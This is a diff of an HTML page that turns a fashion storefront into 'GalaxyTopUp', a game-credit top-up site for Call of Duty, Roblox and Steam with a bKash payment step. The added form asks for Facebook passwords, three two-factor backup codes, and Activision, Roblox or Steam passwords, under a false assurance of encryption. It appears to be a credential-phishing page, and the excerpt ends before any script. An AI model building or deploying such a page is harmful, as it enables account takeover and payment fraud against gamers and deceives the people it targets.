@@ -3,414 +3,1323 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Matrix Fashion</title>
-
-<link rel="icon" type="image/png" href="logo.png">
-
+<title>GalaxyTopUp — Premium Game Credits</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&family=Space+Mono&display=swap" rel="stylesheet">
 <style>
+  :root {
+    --bg: #04050f;
+    --bg2: #080b1a;
+    --card: #0d1129;
+    --border: #1a2444;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --accent3: #a855f7;
+    --gold: #ffd700;
+    --text: #e8eaf6;
+    --muted: #8892b0;
+    --success: #00ff88;
+    --danger: #ff4757;
+    --glow: 0 0 20px rgba(0,212,255,0.4);
+    --glow2: 0 0 20px rgba(168,85,247,0.4);
+  }
 
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:Arial;
-}
+  * { margin:0; padding:0; box-sizing:border-box; }
 
-body{
-  background:#f5f5f5;
-}
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
 
-/* HEADER */
-header{
-  background:black;
-  color:white;
-  padding:20px;
-  position:sticky;
-  top:0;
-  z-index:1000;
-}
+  /* ── BACKGROUND GRID ── */
+  body::before {
+    content:'';
+    position:fixed; inset:0; z-index:0;
+    background-image:
+      linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events:none;
+  }
 
-.top-header{
-  width:90%;
-  margin:auto;
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-}
+  /* ── HEADER ── */
+  header {
+    position: sticky; top:0; z-index:100;
+    background: rgba(4,5,15,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    display: flex; align-items:center; justify-content:space-between;
+    height: 64px;
+  }
 
-.logo{
-  font-size:28px;
-  font-weight:bold;
-}
+  .logo {
+    font-family:'Orbitron',sans-serif;
+    font-weight:900; font-size:1.4rem;
+    background: linear-gradient(90deg, var(--accent), var(--accent3));
+    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+    letter-spacing: 2px;
+  }
 
-.cart-btn{
-  background:white;
-  color:black;
-  padding:10px 15px;
-  border-radius:10px;
-  cursor:pointer;
-  font-weight:bold;
-}
+  .logo span { color: var(--accent2); -webkit-text-fill-color: var(--accent2); }
 
-/* HERO */
-.hero{
-  width:90%;
-  margin:40px auto;
-  display:grid;
-  grid-template-columns:1fr 1.2fr 1fr;
-  gap:20px;
-  align-items:center;
-}
+  .nav-actions { display:flex; gap:12px; align-items:center; }
 
-.review-image img{
-  width:100%;
-  border-radius:20px;
-}
+  .cart-btn {
+    background: transparent;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    padding: 8px 16px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-family:'Rajdhani',sans-serif;
+    font-weight:600; font-size:0.95rem;
+    display:flex; align-items:center; gap:8px;
+    transition: all .2s;
+  }
+  .cart-btn:hover { background: rgba(0,212,255,0.1); box-shadow: var(--glow); }
 
-/* FEATURES */
-.feature{
-  padding:16px;
-  margin-bottom:10px;
-  border-radius:14px;
-  color:#222;
-  font-weight:bold;
-  display:flex;
-  align-items:center;
-  gap:10px;
-  background:#fff;
-  border:1px solid #e6e6e6;
-  box-shadow:0 6px 18px rgba(0,0,0,0.08);
-  transition:0.3s;
-}
+  .cart-count {
+    background: var(--accent2);
+    color:#fff;
+    border-radius:50%;
+    width:20px; height:20px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:0.75rem; font-weight:700;
+  }
 
-.feature:hover{
-  transform:translateY(-3px);
-}
+  /* ── PAGES ── */
+  .page { display:none; position:relative; z-index:1; }
+  .page.active { display:block; }
 
-/* CATEGORY */
-.category{
-  width:90%;
-  margin:20px auto;
-}
+  /* ── NOTICEBOARD ── */
+  .noticeboard-wrap {
+    max-width:1100px; margin:32px auto; padding:0 24px;
+  }
 
-.category button{
-  background:black;
-  color:white;
-  padding:12px 18px;
-  border:none;
-  margin:5px;
-  border-radius:10px;
-  cursor:pointer;
-}
+  .notice-header {
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:16px;
+  }
 
-/* PRODUCTS */
-.products{
-  width:90%;
-  margin:auto;
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-  gap:20px;
-}
+  .notice-title {
+    font-family:'Orbitron',sans-serif;
+    font-size:1rem; letter-spacing:3px;
+    color: var(--gold);
+    display:flex; align-items:center; gap:10px;
+  }
 
-.card{
-  background:white;
-  border-radius:15px;
-  overflow:hidden;
-  box-shadow:0 5px 20px rgba(0,0,0,0.1);
-}
+  .notice-title::before {
+    content:'';
+    width:8px; height:8px;
+    border-radius:50%;
+    background: var(--gold);
+    animation: pulse 1.5s infinite;
+  }
 
-.card img{
-  width:100%;
-  height:260px;
-  object-fit:contain;
-}
+  @keyframes pulse { 0%,100%{ opacity:1; } 50%{ opacity:0.3; } }
 
-.card-content{
-  padding:15px;
-}
+  .notice-edit-btn {
+    background: transparent;
+    border: 1px solid var(--gold);
+    color: var(--gold);
+    padding: 6px 14px;
+    border-radius:4px;
+    cursor:pointer;
+    font-family:'Rajdhani',sans-serif;
+    font-size:0.85rem; font-weight:600;
+    transition: all .2s;
+  }
+  .notice-edit-btn:hover { background: rgba(255,215,0,0.1); }
 
-.price{
-  font-weight:bold;
-  margin:5px 0;
-}
+  .noticeboard {
+    background: linear-gradient(135deg, rgba(255,215,0,0.06), rgba(255,107,53,0.04));
+    border: 1px solid rgba(255,215,0,0.3);
+    border-left: 4px solid var(--gold);
+    border-radius:8px;
+    padding: 16px 20px;
+    font-size:0.95rem; line-height:1.7;
+    color: #f0e68c;
+  }
 
-.stock{
-  color:green;
-  font-weight:bold;
-}
+  .notice-textarea {
+    width:100%; min-height:80px;
+    background: rgba(255,215,0,0.05);
+    border: 1px solid rgba(255,215,0,0.4);
+    border-radius:6px;
+    color: #f0e68c;
+    font-family:'Rajdhani',sans-serif;
+    font-size:0.95rem; line-height:1.7;
+    padding:12px;
+    resize:vertical;
+    outline:none;
+  }
 
-button.buy{
-  width:100%;
-  padding:10px;
-  background:black;
-  color:white;
-  border:none;
-  border-radius:10px;
-  cursor:pointer;
-}
+  .notice-save-btn {
+    margin-top:10px;
+    background: var(--gold);
+    color:#000;
+    border:none;
+    padding:8px 20px;
+    border-radius:5px;
+    font-family:'Rajdhani',sans-serif;
+    font-weight:700; font-size:0.9rem;
+    cursor:pointer;
+    transition: opacity .2s;
+  }
+  .notice-save-btn:hover { opacity:.85; }
 
-/* CART */
-.side-cart{
-  position:fixed;
-  right:-400px;
-  top:0;
-  width:380px;
-  height:100vh;
-  background:white;
-  padding:20px;
-  transition:0.3s;
-  overflow:auto;
-}
+  /* ── HERO ── */
+  .hero {
+    text-align:center;
+    padding: 48px 24px 24px;
+    max-width:1100px; margin:0 auto;
+  }
 
-.side-cart.active{
-  right:0;
-}
+  .hero h1 {
+    font-family:'Orbitron',sans-serif;
+    font-size:clamp(1.8rem, 5vw, 3.2rem);
+    font-weight:900;
+    line-height:1.1;
+    background: linear-gradient(135deg, #fff 0%, var(--accent) 50%, var(--accent3) 100%);
+    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+    margin-bottom:12px;
+  }
 
-input,textarea{
-  width:100%;
-  padding:10px;
-  margin-top:10px;
-  border:1px solid #ddd;
-}
+  .hero p {
+    color: var(--muted); font-size:1.05rem;
+    max-width:500px; margin:0 auto;
+  }
 
-.order-btn{
-  width:100%;
-  padding:12px;
-  background:black;
-  color:white;
-  border:none;
-  margin-top:10px;
-  border-radius:10px;
-}
+  /* ── GAME GRID ── */
+  .section-label {
+    font-family:'Orbitron',sans-serif;
+    font-size:0.8rem; letter-spacing:4px;
+    color: var(--muted);
+    text-align:center;
+    margin: 40px 0 24px;
+    position:relative;
+  }
+  .section-label::before,.section-label::after {
+    content:'';
+    position:absolute; top:50%;
+    width:calc(50% - 120px);
+    height:1px; background: var(--border);
+  }
+  .section-label::before{ left:0; }
+  .section-label::after{ right:0; }
 
-/* CART BUTTONS */
-.cart-item{
-  padding:10px;
-  border-bottom:1px solid #ddd;
-}
+  .game-grid {
+    display:grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap:20px;
+    max-width:1100px; margin:0 auto;
+    padding:0 24px 60px;
+  }
 
-.cart-item button{
-  margin:3px;
-  padding:4px 8px;
-  cursor:pointer;
-}
+  .game-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius:12px;
+    overflow:hidden;
+    cursor:pointer;
+    transition: transform .25s, box-shadow .25s, border-color .25s;
+    position:relative;
+    group:hover;
+  }
 
+  .game-card:hover {
+    transform: translateY(-6px);
+    border-color: var(--accent);
+    box-shadow: 0 0 30px rgba(0,212,255,0.2), 0 20px 40px rgba(0,0,0,0.4);
+  }
+
+  .game-card::after {
+    content:'';
+    position:absolute; inset:0;
+    background: linear-gradient(180deg, transparent 40%, rgba(0,0,0,0.8) 100%);
+  }
+
+  .game-img {
+    width:100%; aspect-ratio:4/3;
+    object-fit:cover;
+    display:block;
+  }
+
+  /* fallback colored banners when no image */
+  .game-img-placeholder {
+    width:100%; aspect-ratio:4/3;
+    display:flex; align-items:center; justify-content:center;
+    font-size:3.5rem;
+  }
+
+  .cod-banner  { background: linear-gradient(135deg,#1a1a2e,#16213e,#0f3460); }
+  .roblox-banner { background: linear-gradient(135deg,#cc0000,#ff3333,#ff6666); }
+  .steam-banner { background: linear-gradient(135deg,#1b2838,#2a475e,#1b2838); }
+
+  .game-info {
+    position:absolute; bottom:0; left:0; right:0; z-index:1;
+    padding:16px;
+  }
+
+  .game-name {
+    font-family:'Orbitron',sans-serif;
+    font-size:1rem; font-weight:700;
+    color:#fff; margin-bottom:4px;
+  }
+
+  .game-currency {
+    font-size:0.85rem; color: var(--accent);
+    font-weight:600;
+  }
+
+  .game-badge {
+    position:absolute; top:12px; right:12px; z-index:2;
+    background: var(--accent2);
+    color:#fff;
+    font-size:0.7rem; font-weight:700;
+    padding:3px 8px; border-radius:3px;
+    letter-spacing:1px;
+  }
+
+  /* ── PRODUCT PAGE ── */
+  .product-page {
+    max-width:900px; margin:0 auto;
+    padding:32px 24px 60px;
+  }
+
+  .back-btn {
+    background:transparent;
+    border:1px solid var(--border);
+    color: var(--muted);
+    padding:8px 16px; border-radius:6px;
+    cursor:pointer;
+    font-family:'Rajdhani',sans-serif;
+    font-size:0.9rem;
+    display:inline-flex; align-items:center; gap:8px;
+    margin-bottom:28px;
+    transition: all .2s;
+  }
+  .back-btn:hover { border-color:var(--accent); color:var(--accent); }
+
+  .product-header {
+    display:flex; align-items:center; gap:20px;
+    margin-bottom:32px;
+    padding-bottom:24px;
+    border-bottom:1px solid var(--border);
+  }
+
+  .product-icon {
+    width:72px; height:72px;
+    border-radius:12px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:2.2rem;
+    flex-shrink:0;
+    border:1px solid var(--border);
+  }
+
+  .product-meta h2 {
+    font-family:'Orbitron',sans-serif;
+    font-size:1.6rem; font-weight:900;
+    margin-bottom:6px;
+  }
+
+  .product-meta p { color:var(--muted); font-size:0.95rem; }
+
+  /* packages */
+  .section-title {
+    font-family:'Orbitron',sans-serif;
+    font-size:0.85rem; letter-spacing:3px;
+    color:var(--muted);
+    margin-bottom:16px;
+    text-transform:uppercase;
+  }
+
+  .packages {
+    display:grid;
+    grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+    gap:14px;
+    margin-bottom:32px;
+  }
+
+  .pkg-card {
+    background: var(--card);
+    border: 2px solid var(--border);
+    border-radius:10px;
+    padding:18px 16px;
+    cursor:pointer;
+    transition: all .2s;
+    position:relative;
+    text-align:center;
+  }
+
+  .pkg-card:hover { border-color: var(--accent); box-shadow: var(--glow); }
+  .pkg-card.selected {
+    border-color: var(--accent);
+    background: rgba(0,212,255,0.08);
+    box-shadow: var(--glow);
+  }
+
+  .pkg-card .popular-tag {
+    position:absolute; top:-10px; left:50%; transform:translateX(-50%);
+    background: var(--accent2);
+    color:#fff; font-size:0.7rem; font-weight:700;
+    padding:2px 10px; border-radius:10px; letter-spacing:1px;
+    white-space:nowrap;
+  }
+
+  .pkg-amount {
+    font-family:'Orbitron',sans-serif;
+    font-size:1.1rem; font-weight:700;
+    color:#fff; margin-bottom:4px;
+  }
+
+  .pkg-bonus {
+    font-size:0.78rem; color: var(--success);
+    margin-bottom:10px;
+    font-weight:600;
+  }
+
+  .pkg-price {
+    font-family:'Space Mono',monospace;
+    font-size:1.2rem; font-weight:700;
+    color: var(--gold);
+  }
+
+  /* account form */
+  .account-form {
+    background: var(--card);
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:24px;
+    margin-bottom:24px;
+  }
+
+  .form-row { margin-bottom:18px; }
+
+  .form-row label {
+    display:block;
+    font-size:0.85rem; font-weight:600;
+    color:var(--muted);
+    margin-bottom:6px;
+    letter-spacing:1px;
+    text-transform:uppercase;
+  }
+
+  .form-row input, .form-row select {
+    width:100%;
+    background: rgba(255,255,255,0.04);
+    border:1px solid var(--border);
+    border-radius:7px;
+    color:var(--text);
+    padding:12px 14px;
+    font-family:'Rajdhani',sans-serif;
+    font-size:1rem;
+    outline:none;
+    transition: border-color .2s, box-shadow .2s;
+  }
+
+  .form-row input:focus, .form-row select:focus {
+    border-color:var(--accent);
+    box-shadow: 0 0 0 3px rgba(0,212,255,0.12);
+  }
+
+  .form-row select option { background:#0d1129; }
+
+  .account-type-tabs {
+    display:flex; gap:10px; margin-bottom:20px;
+  }
+
+  .tab-btn {
+    flex:1;
+    padding:12px;
+    border-radius:8px;
+    border: 2px solid var(--border);
+    background:transparent;
+    color:var(--muted);
+    font-family:'Rajdhani',sans-serif;
+    font-weight:700; font-size:1rem;
+    cursor:pointer;
+    transition: all .2s;
+    display:flex; align-items:center; justify-content:center; gap:8px;
+  }
+
+  .tab-btn.active {
+    border-color: var(--accent3);
+    color:#fff;
+    background: rgba(168,85,247,0.1);
+    box-shadow: var(--glow2);
+  }
+
+  .info-note {
+    background: rgba(0,212,255,0.06);
+    border:1px solid rgba(0,212,255,0.2);
+    border-radius:7px;
+    padding:12px 16px;
+    font-size:0.88rem; color:var(--muted);
+    margin-bottom:18px;
+    display:flex; gap:10px; align-items:flex-start;
+  }
+
+  .info-note .icon { color:var(--accent); font-size:1rem; flex-shrink:0; margin-top:1px; }
+
+  /* order summary */
+  .order-summary {
+    background: rgba(0,212,255,0.04);
+    border:1px solid rgba(0,212,255,0.2);
+    border-radius:10px;
+    padding:16px 20px;
+    margin-bottom:24px;
+  }
+
+  .order-summary h4 {
+    font-family:'Orbitron',sans-serif;
+    font-size:0.8rem; letter-spacing:2px;
+    color:var(--muted);
+    margin-bottom:12px;
+  }
+
+  .order-row {
+    display:flex; justify-content:space-between;
+    padding:6px 0;
+    font-size:0.95rem;
+  }
+
+  .order-row.total {
+    border-top:1px solid var(--border);
+    margin-top:8px; padding-top:14px;
+    font-weight:700; font-size:1.1rem;
+    color:var(--gold);
+  }
+
+  .name-row {
+    display:grid; grid-template-columns:1fr 1fr; gap:12px;
+  }
+
+  /* action btns */
+  .action-row {
+    display:flex; gap:12px;
+    flex-wrap:wrap;
+  }
+
+  .btn-primary {
+    flex:1;
+    background: linear-gradient(135deg, var(--accent), var(--accent3));
+    color:#fff;
+    border:none;
+    padding:14px 24px;
+    border-radius:8px;
+    font-family:'Orbitron',sans-serif;
+    font-weight:700; font-size:0.9rem;
+    cursor:pointer;
+    transition: opacity .2s, transform .1s;
+    letter-spacing:1px;
+  }
+  .btn-primary:hover { opacity:.9; transform:translateY(-1px); }
+  .btn-primary:active { transform:translateY(0); }
+
+  .btn-cart {
+    background: transparent;
+    border: 2px solid var(--accent2);
+    color: var(--accent2);
+    padding:14px 20px;
+    border-radius:8px;
+    font-family:'Orbitron',sans-serif;
+    font-weight:700; font-size:0.85rem;
+    cursor:pointer;
+    transition: all .2s;
+    letter-spacing:1px;
+  }
+  .btn-cart:hover { background:rgba(255,107,53,0.1); }
+
+  /* ── PAYMENT PAGE ── */
+  .payment-page {
+    max-width:600px; margin:0 auto;
+    padding:40px 24px 60px;
+    text-align:center;
+  }
+
+  .payment-card {
+    background: var(--card);
+    border:1px solid var(--border);
+    border-radius:16px;
+    padding:32px 28px;
+  }
+
+  .payment-icon {
+    font-size:3rem; margin-bottom:12px;
+    display:block;
+  }
+
+  .payment-card h2 {
+    font-family:'Orbitron',sans-serif;
+    font-size:1.3rem; margin-bottom:6px;
+  }
+
+  .payment-card p { color:var(--muted); margin-bottom:28px; font-size:0.95rem; }
+
+  .bkash-box {
+    background: linear-gradient(135deg, #e2136e15, #e2136e08);
+    border:2px solid #e2136e55;
+    border-radius:12px;
+    padding:20px;
+    margin-bottom:24px;
+  }
+
+  .bkash-logo { font-size:2rem; margin-bottom:6px; }
+  .bkash-label {
+    font-size:0.8rem; letter-spacing:2px; color:var(--muted);
+    margin-bottom:4px; text-transform:uppercase;
+  }
+  .bkash-number {
+    font-family:'Space Mono',monospace;
+    font-size:1.6rem; font-weight:700;
+    color:#e2136e;
+    letter-spacing:3px;
+  }
+
+  .amount-pill {
+    display:inline-flex; align-items:center; gap:6px;
+    background: rgba(255,215,0,0.1);
+    border:1px solid rgba(255,215,0,0.3);
+    border-radius:20px;
+    padding:6px 16px;
+    font-family:'Space Mono',monospace;
+    font-size:1rem; color:var(--gold);
+    margin-bottom:24px;
+    font-weight:700;
+  }
+
+  .trx-input {
+    width:100%;
+    background: rgba(255,255,255,0.04);
+    border:2px solid var(--border);
+    border-radius:8px;
+    color:var(--text);
+    padding:14px 16px;
+    font-family:'Space Mono',monospace;
+    font-size:1rem;
+    text-align:center;
+    outline:none;
+    transition: border-color .2s;
+    margin-bottom:16px;
+  }
+
+  .trx-input:focus { border-color:#e2136e; }
+
+  .confirm-btn {
+    width:100%;
+    background: linear-gradient(135deg, #e2136e, #c71162);
+    color:#fff;
+    border:none;
+    padding:15px;
+    border-radius:8px;
+    font-family:'Orbitron',sans-serif;
+    font-weight:700; font-size:0.95rem;
+    cursor:pointer;
+    transition: opacity .2s;
+    letter-spacing:1px;
+  }
+  .confirm-btn:hover { opacity:.88; }
+
+  /* ── CART PANEL ── */
+  .cart-overlay {
+    display:none;
+    position:fixed; inset:0; z-index:200;
+    background:rgba(0,0,0,0.65);
+    backdrop-filter:blur(4px);
+  }
+  .cart-overlay.open { display:block; }
+
+  .cart-panel {
+    position:fixed; right:0; top:0; bottom:0;
+    width:min(400px, 100vw);
+    background:var(--bg2);
+    border-left:1px solid var(--border);
+    z-index:201;
+    display:flex; flex-direction:column;
+    transform:translateX(100%);
+    transition:transform .3s cubic-bezier(.4,0,.2,1);
+  }
+  .cart-overlay.open .cart-panel { transform:translateX(0); }
+
+  .cart-head {
+    padding:20px 20px 16px;
+    border-bottom:1px solid var(--border);
+    display:flex; align-items:center; justify-content:space-between;
+  }
+
+  .cart-head h3 {
+    font-family:'Orbitron',sans-serif;
+    font-size:1rem; letter-spacing:2px;
+    color: var(--accent);
+  }
+
+  .close-cart {
+    background:transparent; border:none; color:var(--muted);
+    font-size:1.4rem; cursor:pointer;
+    padding:4px;
+  }
+  .close-cart:hover { color:var(--text); }
+
+  .cart-items { flex:1; overflow-y:auto; padding:16px 20px; }
+
+  .cart-item {
+    display:flex; align-items:center; gap:12px;
+    padding:12px 0;
+    border-bottom:1px solid var(--border);
+  }
+
+  .cart-item-icon { font-size:1.6rem; flex-shrink:0; }
+
+  .cart-item-info { flex:1; }
+  .cart-item-info .name { font-weight:700; font-size:0.95rem; margin-bottom:2px; }
+  .cart-item-info .pkg { font-size:0.82rem; color:var(--muted); }
+
+  .cart-item-price {
+    font-family:'Space Mono',monospace;
+    color:var(--gold); font-size:0.9rem;
+    font-weight:700;
+  }
+
+  .cart-remove {
+    background:transparent; border:none; color:var(--danger);
+    cursor:pointer; font-size:1.1rem; padding:4px;
+  }
+
+  .cart-empty { text-align:center; color:var(--muted); padding:48px 0; }
+  .cart-empty .icon { font-size:3rem; display:block; margin-bottom:12px; }
+
+  .cart-footer {
+    padding:20px;
+    border-top:1px solid var(--border);
+  }
+
+  .cart-total {
+    display:flex; justify-content:space-between;
+    font-family:'Space Mono',monospace;
+    font-size:1.1rem; font-weight:700;
+    color:var(--gold);
+    margin-bottom:16px;
+  }
+
+  .cart-checkout-btn {
+    width:100%;
+    background: linear-gradient(135deg, var(--accent), var(--accent3));
+    color:#fff; border:none;
+    padding:14px;
+    border-radius:8px;
+    font-family:'Orbitron',sans-serif;
+    font-weight:700; font-size:0.9rem;
+    cursor:pointer;
+    transition:opacity .2s;
+    letter-spacing:1px;
+  }
+  .cart-checkout-btn:hover { opacity:.88; }
+
+  /* ── SUCCESS ── */
+  .success-page {
+    max-width:500px; margin:80px auto;
+    text-align:center; padding:0 24px;
+    position:relative; z-index:1;
+  }
+
+  .success-icon { font-size:5rem; display:block; margin-bottom:20px;
+    animation: bounce .6s ease; }
+  @keyframes bounce {
+    0%{ transform:scale(0); } 70%{ transform:scale(1.15); } 100%{ transform:scale(1); }
+  }
+
+  .success-page h2 {
+    font-family:'Orbitron',sans-serif;
+    font-size:1.6rem; margin-bottom:12px;
+    color:var(--success);
+  }
+
+  .success-page p { color:var(--muted); line-height:1.7; margin-bottom:28px; }
+
+  /* ── TOAST ── */
+  .toast {
+    position:fixed; bottom:24px; right:24px; z-index:500;
+    background:var(--card);
+    border:1px solid var(--accent);
+    border-left:4px solid var(--accent);
+    border-radius:8px;
+    padding:12px 18px;
+    display:flex; align-items:center; gap:10px;
+    font-size:0.9rem; font-weight:600;
+    transform:translateY(80px); opacity:0;
+    transition:all .3s;
+    max-width:320px;
+  }
+  .toast.show { transform:translateY(0); opacity:1; }
+  .toast.error { border-color:var(--danger); }
+
+  /* ── MISC ── */
+  .divider { height:1px; background:var(--border); margin:24px 0; }
+
+  .highlight { color:var(--accent); }
+
+  @media(max-width:600px) {
+    .packages { grid-template-columns:1fr 1fr; }
+    .name-row { grid-template-columns:1fr; }
+    .action-row { flex-direction:column; }
+  }
 </style>
 </head>
-
 <body>
 
+<!-- HEADER -->
 <header>
-<div class="top-header">
-<div class="logo">Matrix Fashion</div>
-<div class="cart-btn" onclick="toggleCart()">
-🛒 Cart (<span id="count">0</span>)
-</div>
-</div>
+  <div class="logo">Galaxy<span>TopUp</span></div>
+  <div class="nav-actions">
+    <button class="cart-btn" onclick="toggleCart()">
+      🛒 Cart
+      <div class="cart-count" id="cartCount">0</div>
+    </button>
+  </div>
 </header>
 
-<!-- HERO -->
-<section class="hero">
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PAGE 1 — HOME -->
+<!-- ═══════════════════════════════════════════════ -->
+<div id="homePage" class="page active">
 
-<div>
-<div class="feature">🚚 Fast Delivery</div>
-<div class="feature">💳 Cash On Delivery</div>
-<div class="feature">📧 Email Order</div>
+  <!-- NOTICEBOARD -->
+  <div class="noticeboard-wrap">
+    <div class="notice-header">
+      <div class="notice-title">📢 NOTICEBOARD</div>
+      <button class="notice-edit-btn" onclick="toggleNoticeEdit()">✏️ Edit</button>
+    </div>
+    <div class="noticeboard" id="noticeDisplay">
+      🎮 স্বাগতম GalaxyTopUp-এ! দ্রুত ও নিরাপদ গেম টপআপ সার্ভিস।
+      অর্ডার করার ৩০ মিনিটের মধ্যে ডেলিভারি নিশ্চিত। যেকোনো সমস্যায়
+      আমাদের সাথে যোগাযোগ করুন। ধন্যবাদ! 🚀
+    </div>
+    <div id="noticeEditor" style="display:none">
+      <textarea class="notice-textarea" id="noticeTextarea"></textarea>
+      <button class="notice-save-btn" onclick="saveNotice()">💾 Save Notice</button>
+    </div>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <h1>POWER UP YOUR GAME</h1>
+    <p>Instant delivery · Secure payment · Best prices in BD</p>
+  </div>
+
+  <!-- GAME LIST -->
+  <div class="section-label">CHOOSE YOUR GAME</div>
+
+  <div class="game-grid">
+
+    <!-- Call of Duty -->
+    <div class="game-card" onclick="openGame('cod')">
+      <div class="game-badge">HOT</div>
+      <div class="game-img-placeholder cod-banner">🎯</div>
+      <div class="game-info">
+        <div class="game-name">CALL OF DUTY</div>
+        <div class="game-currency">⚡ CP Points</div>
+      </div>
+    </div>
+
+    <!-- Roblox -->
+    <div class="game-card" onclick="openGame('roblox')">
+      <div class="game-badge">POPULAR</div>
+      <div class="game-img-placeholder roblox-banner">🟥</div>
+      <div class="game-info">
+        <div class="game-name">ROBLOX</div>
+        <div class="game-currency">💎 Robux</div>
+      </div>
+    </div>
+
+    <!-- Steam -->
+    <div class="game-card" onclick="openGame('steam')">
+      <div class="game-img-placeholder steam-banner">🎮</div>
+      <div class="game-info">
+        <div class="game-name">STEAM</div>
+        <div class="game-currency">💵 Wallet Dollars</div>
+      </div>
+    </div>
+
+  </div>
 </div>
 
-<div class="review-image">
-<img src="review.png">
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PAGE 2 — PRODUCT -->
+<!-- ═══════════════════════════════════════════════ -->
+<div id="productPage" class="page">
+  <div class="product-page">
+
+    <button class="back-btn" onclick="goHome()">← Back to Games</button>
+
+    <!-- Product Header -->
+    <div class="product-header">
+      <div class="product-icon" id="prodIcon"></div>
+      <div class="product-meta">
+        <h2 id="prodName"></h2>
+        <p id="prodDesc"></p>
+      </div>
+    </div>
+
+    <!-- Packages -->
+    <div class="section-title">SELECT PACKAGE</div>
+    <div class="packages" id="packagesGrid"></div>
+
+    <!-- Selected summary -->
+    <div class="order-summary" id="orderSummary" style="display:none">
+      <h4>ORDER SUMMARY</h4>
+      <div class="order-row"><span>Game</span><span id="sumGame"></span></div>
+      <div class="order-row"><span>Package</span><span id="sumPkg"></span></div>
+      <div class="order-row total"><span>TOTAL</span><span id="sumPrice"></span></div>
+    </div>
+
+    <!-- Account Type -->
+    <div id="accountSection" style="display:none">
+      <div class="section-title">ACCOUNT INFORMATION</div>
+      <div class="account-form">
+
+        <!-- Account type selector (for CoD) -->
+        <div id="accountTypeSection">
+          <div class="section-title" style="margin-bottom:10px">ACCOUNT TYPE</div>
+          <div class="account-type-tabs" id="accountTypeTabs">
+            <button class="tab-btn active" onclick="setAccountType('facebook')">📘 Facebook</button>
+            <button class="tab-btn" onclick="setAccountType('activision')">🎯 Activision</button>
+          </div>
+        </div>
+
+        <div class="info-note">
+          <span class="icon">🔒</span>
+          <span>Your information is encrypted and kept strictly confidential. Used only for top-up delivery.</span>
+        </div>
+
+        <!-- Name row -->
+        <div class="form-row name-row">
+          <div>
+            <label>First Name</label>
+            <input type="text" id="firstName" placeholder="Your first name">
+          </div>
+          <div>
+            <label>Last Name</label>
+            <input type="text" id="lastName" placeholder="Your last name">
+          </div>
+        </div>
+
+        <!-- Facebook fields -->
+        <div id="fbFields">
+          <div class="form-row">
+            <label>Email / Phone Number</label>
+            <input type="text" id="fbEmail" placeholder="Email or phone linked to Facebook">
+          </div>
+          <div class="form-row">
+            <label>Password</label>
+            <input type="password" id="fbPass" placeholder="Facebook password">
+          </div>
+          <div class="form-row">
+            <label>Two-Step Code 1</label>
+            <input type="text" id="fbCode1" placeholder="2FA backup code #1">
+          </div>
+          <div class="form-row">
+            <label>Two-Step Code 2</label>
+            <input type="text" id="fbCode2" placeholder="2FA backup code #2">
+          </div>
+          <div class="form-row">
+            <label>Two-Step Code 3</label>
+            <input type="text" id="fbCode3" placeholder="2FA backup code #3">
+          </div>
+        </div>
+
+        <!-- Activision fields -->
+        <div id="activFields" style="display:none">
+          <div class="form-row">
+            <label>Activision Login</label>
+            <input type="text" id="activLogin" placeholder="Activision email / username">
+          </div>
+          <div class="form-row">
+            <label>Password</label>
+            <input type="password" id="activPass" placeholder="Activision password">
+          </div>
+        </div>
+
+        <!-- Generic fields for Roblox / Steam -->
+        <div id="genericFields" style="display:none">
+          <div class="form-row">
+            <label>Username / Email</label>
+            <input type="text" id="genUser" placeholder="Account username or email">
+          </div>
+          <div class="form-row">
+            <label>Password</label>
+            <input type="password" id="genPass" placeholder="Account password">
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Actions -->
+      <div class="action-row">
+        <button class="btn-cart" onclick="addToCart()">🛒 Add to Cart</button>
+        <button class="btn-primary" onclick="proceedToPayment()">Continue to Payment →</button>
+      </div>
+    </div>
+
+  </div>
 </div>
 
-<div>
-<div class="feature">🔥 Premium Quality</div>
-<div class="feature">📦 Stock Available</div>
-<div class="feature">✅ Trusted Store</div>
+<!-- ═══════════════════════════════════════════════ -->
+<!-- PAGE 3 — PAYMENT -->
+<!-- ═══════════════════════════════════════════════ -->
+<div id="paymentPage" class="page">
+  <div class="payment-page">
+
+    <button class="back-btn" onclick="goToProduct()">← Back</button>
+
+    <div class="payment-card">
+      <span class="payment-icon">💳</span>
+      <h2>COMPLETE PAYMENT</h2>
+      <p>Send the exact amount to the bKash number below, then enter your transaction ID.</p>
+
+      <div class="bkash-box">
+        <div class="bkash-logo">💖</div>
+        <div class="bkash-label">bKash Send Money</div>
+        <div class="bkash-number">01844175037</div>
+      </div>
+
+      <div class="amount-pill">💰 Total: <span id="payAmount"></span> Taka</div>
+
+      <input class="trx-input" type="text" id="trxInput" placeholder="Enter bKash Transaction ID (TrxID)">
+
+      <button class="confirm-btn" onclick="confirmPayment()">✅ CONFIRM ORDER</button>
+    </div>
+  </div>
 </div>
 
-</section>
-
-<!-- CATEGORY -->
